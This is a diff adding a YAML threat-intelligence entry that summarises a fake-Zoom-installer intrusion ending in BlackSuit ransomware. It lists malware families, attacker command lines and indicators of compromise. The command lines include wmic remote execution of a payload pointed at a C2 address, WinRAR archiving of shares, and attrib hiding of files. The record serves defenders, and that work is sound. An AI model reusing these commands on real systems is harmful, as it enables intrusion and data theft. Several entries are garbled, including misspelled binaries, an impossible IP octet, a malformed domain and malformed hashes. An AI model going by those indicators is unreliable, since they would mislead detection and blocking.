@@ -1,0 +1,120 @@
+description: This report details a cyberattack that began with a malicious Zoom installer,
+  leading to the deployment of BlackSuit ransomware after a nine-day dwell time. The
+  attacker leveraged various tools and techniques including d3f@ckloader, SectopRAT,
+  Cobalt Strike, QDoor, and WinRAR.
+date: '2025-03-31'
+authors:
+- pigerlin
+- UC1
+- Miixxedup
+attribution:
+  threat_actor: Blacksuit
+malware_families:
+- d3f@ckloader
+- SectopRAT
+- Cobalt Strike
+- Brute Ratel (Badgers)
+- BlackSuit
+- Windows.Hacktool.Rubeus
+- Brute Ratel
+- QDoor
+- Blacksuit Ransomware
+TTPs:
+  processes:
+  - Zoom_v_2.00.4.exe
+  - 1522.exe
+  - 152.exe
+  - MSBuild.exe
+  - cmd.exe
+  - regsvr32.exe
+  - run32.exe
+  - WMIC
+  - svhost.exe
+  - PsExec.exe
+  - Edge
+  - WinRAR.exe
+  - svchost.exe
+  - powershell.exe
+  - msedge.exe
+  - Build.exe
+  commandline:
+  - attrib +s +h /D "C:\\Program Files\\Windows NT\\*.*"
+  - '"C:\\Program Files\\WinRAR\\WinRAR.exe" a -ep1 -scul -r0 -iext -imon1 -- . G:\\REDACTED'
+  - wmic /node:"REDACTED" process call create "%WINDIR%\\Temp\\svhost.exe "143.244.146[.]183""
+  - c:\\programdata\\2905.dll
+  - C:\\Windows\\System32\\regsvr32.exe
+  - C:\\Program Files\\WinRAR\\WinRAR.exe x -iext -ver -imonl --c:\\users I 0ownloads\\BAT_COMPS.
+    rar
+  - C:\\Windows\\systen32\\cnd.exe /C wnic /node:"J" process call create C:\\Windows\\Temp\\123.exe
+    -id * I*
+  - '"C:\\windows\\syswow64\\windowspowershell\\v1.@\\powershell.exe" -Version 5.1
+    -s -NoLogo -NoProfile'
+  - '"C:\\Program Files\\WinRAR\\WinRAR.exe" x -iext -ver -imonl --c:\\users I 0ownloads\\BAT_COMPS.
+    rar'
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: MSBuild.exe
+    destination_address: 45.141.87[.]218
+    port: '9000'
+  - executable: Cobalt Strike beacon
+    destination_address: provincial-gaiters-gw.aws-use1.cloud-ara[.]tyk.io
+    url: /api/v2/login
+  - executable: Cobalt Strike beacon
+    destination_address: 44.196.9.9
+    port: '443'
+  - executable: regsvr32.exe
+    destination_address: 143.244.146.183
+    port: 443
+    url: https://mystuff.bublup.com/
+  - executable: svchost.exe
+    destination_address: 52.216.268.177
+    port: null
+  file_modifications:
+  - C:\\Program Files\\Windows NT\\*.*
+  - '%USERPROFILE%\\AppData\\Local\\Temp\\svhost.exe'
+  - C:\\Users\\<redacted>\\Downloads\\winrar-x64-701.exe
+  - C:\\Users\\<redacted>\\Downloads\\winrar-x64-701 (1).exe
+  - C:\\users\\JN0ownLoads\\BAT_COHPS.rar
+  - C:\\users\\JN0ownLoads\\BAT_COMPS.rar
+  - C:\\shares\\conps1.txt
+  - C:\\shares\\conps2.txt
+  - C:\\shares\\conps3.txt
+  - C:\\shares\\conps4.txt
+  - C:\\windows\\temp\\123.exe
+  persistence:
+  - Startup entry creation
+  pipes:
+  - .\\pipe\\\\nojo.5688.8052.3578027332937047305
+  process_relations:
+  - MSBuild.exe -> SectopRAT
+  - SectopRAT -> Brute Ratel
+  - Brute Ratel -> Cobalt Strike
+IOCs:
+- hash: 80110fbb81d0407340b908bb43c815d3
+- hash: 8d4f2aa315ce17505b8698db22ec2526805645a4
+- hash: b837bec967df6748b72c3b43c254532620977d0bbe0fc23e0c178c74516baab9
+- hash: 6c75e2c704f69aaa09cdfd455c7bdbf9336dc7fe
+- hash: f34aad9a56ca9310f40ecbcb075e4be12aaf9ef60fd24893b5e8fb28934cd730
+- hash: 91f69fa3439f843b51c878688963e574
+- hash: c5826e9e3c4b1fece4991f269fd4e5307e92bfe2
+- hash: ecb0b3057163cd25c989a66683cfb47c19f122407cbbb49b1043e908c4f07ad1
+- hash: 27304b246c7d5b4e149124d5f93c5b01
+- hash: e50d9e3bd91908e13a26b3e23edeaf577fb3a095
+- hash: 3337e3875b05e0bfba69ab926532e3f179e8cfbf162ebb60ce58a0281437a7ef
+- ip: 45.141.87[.]218
+- domain: megupdate[.]com
+- domain: provincial-gaiters-gw.aws-use1.cloud-ara[.]tyk.io
+- url: http://78.47.105[.]28/manual/152/152.zip
+- url: http://78.47.105[.]28/manual/152/1522.zip
+- domain: bublup.com
+- hash: b7b4691ad1cdad7663c32d07911a03d9cc8b104724c2825d4957007649235
+- hash: 8714f30e12c0dc61c83491a71dbf9f1e9b6bc66663a8F2c069e7a7841d52c68
+- ip: 143.244.146.183
+- domain: provincial-gaiters-gw.aws-usel.cloud-ara.tyk.io
+- domain: megupdate[.Jcom
+- url: https://mystuff.bublup.com/
+reference: https://thedfirreport.com/2025/03/31/fake-zoom-ends-in-blacksuit-ransomware/
+file_creation_date: May 14, 2025
